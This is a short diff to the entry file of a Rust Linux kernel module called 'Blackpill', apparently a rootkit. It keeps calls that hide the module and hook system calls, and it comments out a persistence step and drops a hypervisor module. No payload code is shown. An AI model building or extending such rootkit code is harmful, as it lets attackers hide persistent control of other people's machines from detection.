@@ -3,13 +3,11 @@
 
 pub(crate) mod hiding;
 pub(crate) mod hooking;
-pub(crate) mod hypervisor;
-pub(crate) mod persistence;
+// pub(crate) mod persistence;
 #[macro_use]
 pub(crate) mod utils;
 pub(crate) mod xdp;
 
-// pub(crate) use alloc::alloc;
 pub(crate) use kernel::prelude::*;
 
 module! {
@@ -30,7 +28,7 @@ impl kernel::Module for Blackpill {
         hiding::hide(module);
 
         // Make it persistent
-        persistence::persist();
+        // persistence::persist();
 
         // Hook syscalls
         hooking::hook_syscalls();
